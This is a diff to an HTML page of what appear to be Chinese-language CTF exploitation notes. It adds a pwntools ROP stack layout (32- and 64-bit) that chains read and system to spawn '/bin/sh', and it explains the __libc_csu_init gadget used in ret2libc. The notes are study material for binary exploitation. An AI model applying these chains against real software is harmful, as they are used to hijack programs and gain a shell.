@@ -1815,6 +1815,20 @@
   
 </li>
       
+        <li class="md-nav__item">
+  <a href="#_1" title="通用技术" class="md-nav__link">
+    通用技术
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#ret2libc" title="ret2libc" class="md-nav__link">
+    ret2libc
+  </a>
+  
+</li>
+      
       
       
       
@@ -2342,6 +2356,20 @@
   
 </li>
       
+        <li class="md-nav__item">
+  <a href="#_1" title="通用技术" class="md-nav__link">
+    通用技术
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#ret2libc" title="ret2libc" class="md-nav__link">
+    ret2libc
+  </a>
+  
+</li>
+      
       
       
       
@@ -2374,6 +2402,61 @@
 <h2 id="srop">srop<a class="headerlink" href="#srop" title="Permanent link">&para;</a></h2>
 <p><a href="https://www.freebuf.com/articles/network/87447.html">https://www.freebuf.com/articles/network/87447.html</a>
 <a href="https://blog.csdn.net/qq_29343201/article/details/72627439">https://blog.csdn.net/qq_29343201/article/details/72627439</a></p>
+<h2 id="_1">通用技术<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h2>
+<p>常用的栈布局如下
+<div class="codehilite"><pre><span></span><span class="c1"># 32位</span>
+<span class="n">flat</span><span class="p">(</span>
+    <span class="p">[</span>
+    <span class="n">read_addr</span><span class="p">,</span>
+    <span class="n">system_addr</span><span class="p">,</span>
+    <span class="mi">0</span><span class="p">,</span> <span class="c1">#read 函数一个参数 fd/system返回地址</span>
+    <span class="n">binsh_addr</span> <span class="c1">#read第二个参数/system第一个参数</span>
+    <span class="p">]</span>
+<span class="p">)</span>
+<span class="c1"># 64位</span>
+<span class="n">flat</span><span class="p">(</span>
+    <span class="p">[</span>
+        <span class="n">pop_edi</span><span class="p">,</span>
+        <span class="mi">0</span><span class="p">,</span> <span class="o">//</span><span class="n">read第一个参数</span> <span class="n">fd</span>
+        <span class="n">pop_rsi</span><span class="p">,</span>
+        <span class="n">binsh_addr</span><span class="p">,</span> <span class="c1">#read第二个参数 sh字符串地址</span>
+        <span class="n">pop_rdx</span><span class="p">,</span> 
+        <span class="mi">20</span><span class="p">,</span>      <span class="c1">#read第三个参数 长度</span>
+        <span class="n">read_addr</span><span class="p">,</span>
+        <span class="n">pop_rdi</span><span class="p">,</span> 
+        <span class="n">binsh_addr</span><span class="p">,</span><span class="c1"># system第一个参数</span>
+        <span class="n">system_addr</span><span class="p">,</span>
+    <span class="p">]</span>
+<span class="p">)</span>
+</pre></div></p>
+<h2 id="ret2libc">ret2libc<a class="headerlink" href="#ret2libc" title="Permanent link">&para;</a></h2>
+<p>64下通用gadget,<code>__libc_csu_init</code>,一共两端代码，可以设置三个寄存器传参的值
+<div class="codehilite"><pre><span></span><span class="c">;第一段代码gad1</span>
+  <span class="nf">pop</span>     <span class="no">rbx</span>  <span class="c">;必须为0</span>
+  <span class="nf">pop</span>     <span class="no">rbp</span>  <span class="c">;必须为1</span>
+  <span class="nf">pop</span>     <span class="no">r12</span>  <span class="c">;你call函数的地址(应该是got上的?)</span>
+  <span class="nf">pop</span>     <span class="no">r13</span>  <span class="c">;arg3</span>
+  <span class="nf">pop</span>     <span class="no">r14</span>  <span class="c">;arg2</span>
+  <span class="nf">pop</span>     <span class="no">r15</span>  <span class="c">;arg1</span>
+  <span class="nf">retn</span>         <span class="c">;gad2</span>
+</pre></div></p>
+<div class="codehilite"><pre><span></span><span class="c">;第二段代码gad2</span>
+<span class="nf">mov</span>     <span class="no">rdx</span><span class="p">,</span> <span class="no">r13</span>
+<span class="nf">mov</span>     <span class="no">rsi</span><span class="p">,</span> <span class="no">r14</span>
+<span class="nf">mov</span>     <span class="no">edi</span><span class="p">,</span> <span class="no">r15d</span>
+<span class="nf">call</span>    <span class="no">qword</span> <span class="no">ptr</span> <span class="p">[</span><span class="no">r12</span><span class="err">+</span><span class="no">rbx</span><span class="p">*</span><span class="mi">8</span><span class="p">]</span> <span class="no">call</span><span class="p">!!!</span>
+<span class="nf">add</span>     <span class="no">rbx</span><span class="p">,</span> <span class="mi">1</span>
+<span class="nf">cmp</span>     <span class="no">rbx</span><span class="p">,</span> <span class="no">rbp</span>
+<span class="nf">jnz</span>     <span class="no">short</span> <span class="no">loc_400880</span>
+<span class="nf">add</span>     <span class="no">rsp</span><span class="p">,</span> <span class="mi">8</span>
+<span class="nf">pop</span>     <span class="no">rbx</span>
+<span class="nf">pop</span>     <span class="no">rbp</span>
+<span class="nf">pop</span>     <span class="no">r12</span>
+<span class="nf">pop</span>     <span class="no">r13</span>
+<span class="nf">pop</span>     <span class="no">r14</span>
+<span class="nf">pop</span>     <span class="no">r15</span> <span class="c">;这个地方可以构造错位gadgets,恰好可以构造为pop rdi,ret</span>
+<span class="nf">retn</span>     <span class="c">;构造一些垫板(7*8=56byte)，因为后面后面还有很多pop+rbp+ret</span>
+</pre></div>
                 
                   
                 
